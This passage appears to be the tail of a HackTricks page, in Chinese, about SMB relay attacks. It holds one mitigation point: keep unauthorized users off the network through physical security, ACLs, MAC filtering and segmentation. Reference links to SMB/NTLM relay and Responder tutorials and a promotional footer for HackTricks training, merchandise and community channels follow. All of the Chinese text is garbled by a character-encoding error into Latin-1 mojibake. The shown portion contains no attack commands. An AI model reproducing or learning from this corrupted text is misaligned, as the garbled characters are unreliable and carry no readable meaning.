4\. **é˜²æ­¢ç½‘ç»œä¸Šçš„æœªç»æˆæƒç”¨æˆ·**ã€‚å†…éƒ¨å¨èƒå¯èƒ½ä¸ä¼šåˆ©ç”¨ SMB ä¸­ç»§æ”»å‡»ï¼Œå› ä¸ºä»–ä»¬å·²ç»æ‹¥æœ‰ç½‘ç»œå‡­æ®ã€‚é€šè¿‡åŠ å¼ºç‰©ç†å®‰å…¨ç­–ç•¥ã€ä½¿ç”¨ ACL å’Œ MAC è¿‡æ»¤å™¨é˜»æ­¢ç½‘ç»œä¸Šçš„æ¶æ„è®¾å¤‡ï¼Œå¹¶ç¡®ä¿é€‚å½“çš„ç½‘ç»œåˆ†å‰²ï¼Œå¯ä»¥å¤§å¤§é™åˆ¶æ­¤æ”»å‡»è¢«æ‰§è¡Œçš„å¨èƒã€‚

## å‚è€ƒèµ„æ–™

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **å›¾ç‰‡æ¥æºï¼š**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶ NFT çš„æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live) ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
